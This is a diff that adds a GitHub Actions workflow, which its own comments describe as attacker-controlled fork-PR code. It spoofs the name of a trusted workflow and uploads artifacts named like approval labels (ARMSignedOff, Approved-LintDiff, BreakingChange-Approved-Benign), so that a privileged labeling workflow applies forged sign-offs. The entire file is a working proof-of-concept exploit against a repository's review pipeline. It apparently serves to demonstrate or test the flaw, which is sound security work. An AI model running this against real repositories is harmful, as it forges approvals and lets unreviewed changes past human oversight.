@@ -1,0 +1,28 @@
+# Attacker-controlled workflow in the PR head. In the real attack this is a fork PR.
+# The NAME is the only thing that matters: it matches an entry in Update Labels'
+# `workflow_run.workflows` filter.
+name: ARM Universal Auto SignOff
+on:
+  pull_request:
+    types: [opened, synchronize]
+jobs:
+  signoff:
+    runs-on: ubuntu-latest
+    steps:
+      - run: echo "ARMSignedOff=true;Approved-LintDiff=true;Approved-Avocado=true;BreakingChange-Approved-Benign=true" > /tmp/empty.txt
+      - uses: actions/upload-artifact@v4
+        with:
+          name: label-ARMSignedOff=true
+          path: /tmp/empty.txt
+      - uses: actions/upload-artifact@v4
+        with:
+          name: label-Approved-LintDiff=true
+          path: /tmp/empty.txt
+      - uses: actions/upload-artifact@v4
+        with:
+          name: label-Approved-Avocado=true
+          path: /tmp/empty.txt
+      - uses: actions/upload-artifact@v4
+        with:
+          name: label-BreakingChange-Approved-Benign=true
+          path: /tmp/empty.txt
